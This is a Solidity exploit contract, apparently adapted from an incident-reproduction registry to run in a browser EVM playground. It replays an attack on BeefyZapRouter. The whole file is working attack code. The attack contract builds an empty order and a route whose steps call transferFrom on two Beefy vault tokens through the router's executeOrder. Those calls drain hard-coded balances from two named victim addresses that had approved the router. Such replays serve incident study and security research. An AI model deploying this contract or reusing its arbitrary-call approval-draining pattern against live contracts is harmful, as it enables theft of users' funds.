// SPDX-License-Identifier: UNLICENSED
pragma solidity ^0.8.10;

// Synthetic standalone exploit for the EVM Playground (2025-08-BeefyZapRouter).
//
// The registry PoC wraps the attack in a Foundry `ContractTest is
// BaseTestWithBalanceLog` harness. The browser EVM has no cheatcodes and no
// forge-std, so this version drops the Test wrapper entirely and keeps only
// the standalone `BeefyZapRouterAttack` helper contract from
// test/BeefyZapRouter_exp.sol, unchanged in logic. It builds its own Order +
// Step route and calls BeefyZapRouter.executeOrder() directly — no
// TokenManager/Permit2 interaction is needed because order.inputs is empty.

address constant VICTIM_A = 0x402a29fbb2F8b21907f89F257f9CDeD90a815a80;
address constant VICTIM_B = 0x8BC19C94D8e7f0896507bbb399742DAa1e13d26E;
address constant BEEFY_ZAP_ROUTER = 0xf49F7bB6F4F50d272A0914a671895c4384696E5A;
address constant BEEFY_VAULT_A = 0x25071C7Cf437F756a4AF9260aDCe5a639e143F93;
address constant BEEFY_VAULT_B = 0x36295709Ebb6df19f6D78127F8D2e5580AE7336f;

uint256 constant VAULT_A_AMOUNT = 2_782_482_153_324_467_704_932;
uint256 constant VAULT_B_AMOUNT = 2_779_110_877_218_055_686_129;

interface IERC20Min {
    function transferFrom(address from, address to, uint256 amount) external returns (bool);
}

interface IBeefyZapRouter {
    struct Input {
        address token;
        uint256 amount;
    }

    struct Output {
        address token;
        uint256 minOutputAmount;
    }

    struct Relay {
        address target;
        uint256 value;
        bytes data;
    }

    struct StepToken {
        address token;
        int32 index;
    }

    struct Step {
        address target;
        uint256 value;
        bytes data;
        StepToken[] tokens;
    }

    struct Order {
        Input[] inputs;
        Output[] outputs;
        Relay relay;
        address user;
        address recipient;
    }

    function executeOrder(Order calldata order, Step[] calldata route) external payable;
}

contract BeefyZapRouterAttack {
    function run() external {
        IBeefyZapRouter.Order memory order;
        order.inputs = new IBeefyZapRouter.Input[](0);
        order.outputs = new IBeefyZapRouter.Output[](0);
        order.relay = IBeefyZapRouter.Relay({target: address(0), value: 0, data: ""});
        order.user = address(this);
        order.recipient = address(this);

        IBeefyZapRouter.Step[] memory route = new IBeefyZapRouter.Step[](2);
        route[0].target = BEEFY_VAULT_A;
        route[0].value = 0;
        route[0].data = abi.encodeWithSelector(IERC20Min.transferFrom.selector, VICTIM_A, address(this), VAULT_A_AMOUNT);
        route[0].tokens = new IBeefyZapRouter.StepToken[](0);

        route[1].target = BEEFY_VAULT_B;
        route[1].value = 0;
        route[1].data = abi.encodeWithSelector(IERC20Min.transferFrom.selector, VICTIM_B, address(this), VAULT_B_AMOUNT);
        route[1].tokens = new IBeefyZapRouter.StepToken[](0);

        IBeefyZapRouter(BEEFY_ZAP_ROUTER).executeOrder(order, route);
    }
}
